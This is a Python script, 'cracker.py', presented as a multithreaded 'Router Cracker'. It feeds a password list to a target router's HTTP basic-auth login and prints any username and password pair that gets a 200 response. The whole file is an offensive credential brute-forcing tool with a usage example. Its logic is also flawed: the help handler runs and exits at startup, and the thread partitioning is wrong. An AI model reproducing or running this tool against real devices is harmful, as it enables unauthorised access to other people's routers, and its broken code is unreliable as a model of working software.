#!/usr/bin/python
# -*- coding: utf-8 -*-

"""
Copyright (c) 2019 Luiz Fritsch

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
"""

import requests
import sys
import argparse
import threading

__author__ = "Luiz Guilherme Fritsch"
__copyright__ = "Copyright (c) 2019 Luiz Fritsch"
__credits__ = ["Luiz Guilherme Fritsch"]
__license__ = "MIT License"
__version__ = "1.0.1"
__maintainer__ = "Luiz Fritsch"
__email__ = "fritsch.guilherm3@gmail.com"
__GITHUB__  =   "https://github.com/luizfritsch"

CRACKED_PASSWORD = None

def divisores(num):
    for i in range(1, int(num/2+1)):
        if num % i == 0: 
           yield i
    yield num

def usage():
	print ()
	print ()
	print ()
	print ()
	print ()
	print ()
	print ()
	print ("Usage: ")
	print ("python cracker.py -t [TARGETs IP] -u [USER TO TEST] -p [PATH TO passwordlist] -a [QTD DE THREADS]")
	print ("")
	print ("Example: ") 
	print ("python cracker.py -t 192.168.0.1 -u admin -p passwordlist.txt -a 4")
	print ()
	print ()
	print ()
	print ()
	sys.exit(0)

def bruteforce(target, passwords, username):
	
	try:
	
		i = 0
		
		for password in passwords:
			
			i = i + 1
			
			password = str(password.rstrip())
			test = requests.get('http://'+target, auth=(username, password))
			code = test.status_code
			
			print  ('[',i,']         USER[',username,']          PASS [',password,']')
			
			if code == 200:
				print ()
				print ("==========================[LOGIN FOUNDED]==========================")
				print ()
				print ("===================================================================")
				print ("                 [  :: USER[",username,"] AND PASS[",password,"]  ]")
				print ("===================================================================")
				print ()
				print ()
				global CRACKED_PASSWORD
				CRACKED_PASSWORD = password
				print ()
				print ()
			
			elif (code == 407) :
				pass
			
			else:
				print ("Password not found")
				sys.exit(0)

	except Exception as e:
		print (e)
		sys.exit(0)



try:
	global target
	global passlist
	global username
	
	target = ''
	passlist = ''
	username = ''

	#Faz o parsing dos argumentos
	parser = argparse.ArgumentParser(description = "Router Cracker", add_help = False)
	parser.add_argument('-h', '--help', action=usage(), help='usage')
	parser.add_argument('-t', '--target',help='Informe o ip do roteador alvo')
	parser.add_argument('-p', '--passlist',help='Informe a lista de senhas')
	parser.add_argument('-u','--username',help='Informe o usuário')
	parser.add_argument('-a','--threads',help='Informe a quantidade de threads')
	
	args = parser.parse_args()
	
	target = args.target
	username = args.username
	qtdThreads = int(args.threads)

	#Le o arquivo de senhas
	fd = open(args.passlist, 'r')
		
	#Salva numa lista
	passwords = fd.readlines()

	#Pega a quantidade de elementos que tem na lista de senhas
	qtdElementosNaLista = len(passwords)

	print ()
	print ("==========================[Começando]==========================")
	print ()
		
	#Acha os divisores
	divisor = list(divisores(qtdElementosNaLista))
		
	#Acha o maior divisor, que nao seja ele mesmo
	md = 0


	if divisor[-1] == len(passwords):
		
		try:
			
			md = divisor[-2]	
		
		except Exception as e:
			
			print (e)
			print ("...")
			print ("	...")
			print ("		...")
			print ("	...")
			print ("...")
			print ("Exiting")
			
			sys.exit(0)

	else:

		md = divisor[-1]

	print ()
	print ("==========================[Dividindo e conquistando]==========================")
	print ()

	#Separa a lista em n listas, onde n = maior divisor
	splited = [passwords[i::md] for i in range(md)]

	#Divide a lista em n listas, onde n = quantidade de threads
	qtd = int(int(qtdElementosNaLista)/int(qtdThreads))

	separador = 0

	threads = []

	for i in range(0,qtdThreads):
		
		arrays = passwords[separador:qtd]
		
		locals()['thread%d' % i] = threading.Thread(target=bruteforce,args=[target, arrays, username])
		
		separador = separador + qtd
		
		qtd = qtd + qtd
	
	for i in range(0,qtdThreads):
		
		locals()['thread%d' % i].start()
		
		threads.append(locals()['thread%d' % i])


	for t in threads:
	    
	    t.join()
	 
	
	print ("Saindo da main")

except Exception as e:

	print (e)
	sys.exit(0)
